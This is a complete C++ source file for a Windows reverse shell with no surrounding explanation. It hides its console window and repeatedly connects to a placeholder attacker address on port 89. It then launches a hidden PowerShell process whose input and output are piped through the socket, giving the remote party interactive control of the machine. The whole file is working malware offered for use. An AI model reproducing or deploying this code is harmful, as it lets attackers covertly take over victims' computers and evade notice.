#include <WinSock2.h>
#include <stdio.h>
#include <Windows.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32");

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    sockaddr_in shell_addr;
    WSADATA wsa;

    char ip_addr[] = "YOUR_IP_ADDR";
    int port = 89;

    WSAStartup(MAKEWORD(2,2), &wsa);

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    while (true)
    {
        SOCKET shell;
        shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        int connection = WSAConnect(shell, (SOCKADDR*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
        if (connection != SOCKET_ERROR)
        {
            char recServer[1024];
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            recv(shell, recServer, sizeof(recServer), 0);
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
            si.wShowWindow = SW_HIDE;
            CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, INFINITE);
            memset(recServer, 0, sizeof(recServer));
        }
    }
}
